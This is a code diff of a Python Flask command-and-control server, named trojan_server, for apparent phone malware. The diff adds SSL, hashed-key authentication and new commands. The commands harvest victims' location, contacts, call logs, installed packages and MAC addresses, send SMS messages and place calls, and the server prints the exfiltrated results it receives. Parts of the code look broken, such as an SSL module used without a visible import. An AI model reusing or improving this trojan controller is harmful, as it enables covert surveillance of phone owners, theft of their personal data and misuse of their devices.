@@ -8,11 +8,18 @@ import argparse
 import os
 import signal
 import json
+import hashlib
+import logging
+
 
 KEY = 'LOL' + '8df639b301a1e10c36cc2f03bbdf8863'
 
 
-class parse_arg:
+ssl = SSL.Context(SSL.SSLv23_METHOD)
+ssl.use_privatekey_file('app.key')
+ssl.use_certificate_file('app.crt')
+
+class parse_args:
 	def __init__(self):
 		self.parser = argparse.ArgumentParser(description='ACTION')
 		self.parser.add_argument('--location', dest='location', action='store_true', default=False,
@@ -21,10 +28,14 @@ class parse_arg:
                    help='get Contacts')
 		self.parser.add_argument('--calllogs', dest='calllogs', action='store_true', default=False,
                    help='Get calllogs')
+		self.parser.add_argument('--packages', dest='packages', action='store_true', default=False,
+                   help='get installed packages')
 		self.parser.add_argument('--mac', dest='mac', action='store_true', default=False,
                    help='get Mac address')
-		self.parser.add_argument('--sendsms', dest='sendsms', action='store', nargs='*', default=False,
+		self.parser.add_argument('--sendsms', dest='sendsms', action='store', metavar=('PhoneNumber', 'Message'), nargs=2, default=False,
                    help='Send SMS')
+		self.parser.add_argument('--call', dest='call', action='store', metavar=('PhoneNumber', 'calltime'), nargs=2, default=False,
+                   help='call a number for X millisecondes')
 		self.parser.add_argument('-v', '--verbose', dest='verbose', action='store_true', default=False,
                    help='verbose')
 		self.args = self.parser.parse_args()
@@ -34,11 +45,12 @@ class parse_arg:
 
 
 class trojan_server():
-	def __init__(self, app, host, port, args):
+	def __init__(self, app, host, port, args, ssl=False):
 		self.app = app
 		self.host = host
 		self.port = port
 		self.args = args
+		self.ssl=ssl
 		self.null = 'null'
 		self.excludeargs = ['verbose']
 		self.nullaction = False
@@ -50,27 +62,42 @@ class trojan_server():
 		self.app.add_url_rule('/result' , view_func=self.result, methods=['POST',])
 
 	def start(self):
-		self.app.run(host=self.host, port=self.port, debug=args.verbose)
+		if self.args.verbose == False:
+			logging.getLogger('werkzeug').setLevel(logging.ERROR)
+
+		if self.ssl == False:
+			self.app.run(host=self.host, port=self.port, debug=self.args.verbose)
+		else:
+			self.app.run(host=self.host, port=self.port, ssl_context=self.ssl, debug=self.args.verbose)
+
+
 
 	def default(self):
   		return 'hello'
 
 	def action(self):
-
-		for arg, value in sorted(vars(args).items()):
+		for arg, value in sorted(vars(self.args).items()):
 			if value != False and self.nullaction != True and arg not in self.excludeargs:
 				return Response(json.dumps({arg: value}), status=200, mimetype='application/json')
 		return self.null
 	
 	def result(self):
-		if str(request.form['KEY']) == KEY:
-			print(str(request.form['result']))
+		sha1 = hashlib.sha1()
+		sha1.update(KEY)
+
+		if request.headers.get('Authorization') == sha1.hexdigest():
+			try:
+				print(json.dumps(request.get_json(), indent=3, sort_keys=True, encoding="utf-8"))
+			except:
+				print(str(request.data))
+			
+			nullaction = True
+			self.stop()
+			return Response(self.null, status=200)
 		else:
 			print("Wrong KEY")
-		#print json.dumps(str(result), indent=4)
-		nullaction = True
-		self.stop()
-		return self.null
+			return Response(self.null, status=401)
+		
 
 	def stop(self):
 		func = request.environ.get('werkzeug.server.shutdown')
@@ -80,5 +107,5 @@ class trojan_server():
 
 if __name__ == '__main__':
 	app = Flask(__name__)
-	server = trojan_server(app=app, host='127.0.0.1', port=8080, arg=parse_args.getargs())
+	server = trojan_server(app=app, host='192.168.1.59', port=8080, args=parse_args().getargs(), ssl=ssl)
 	server.start()
